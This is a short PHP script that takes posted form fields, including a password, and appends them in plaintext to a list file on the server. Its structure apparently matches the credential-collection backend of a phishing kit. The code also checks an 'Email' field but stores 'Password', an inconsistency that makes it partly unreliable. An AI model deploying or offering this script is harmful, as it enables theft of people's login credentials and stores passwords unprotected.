<?php
if(isset($_POST['field1']) && isset($_POST['Email'])) {
    $data = $_POST['field1'] . '-' . $_POST['Password'] . "\n";
    $ret = file_put_contents('/list.txt', $data, FILE_APPEND | LOCK_EX);
    if($ret === false) {
        die('There was an error writing this file');
    }
    else {
        echo "$ret bytes written to file";
    }
}
else {
   die('no post data to process');
}
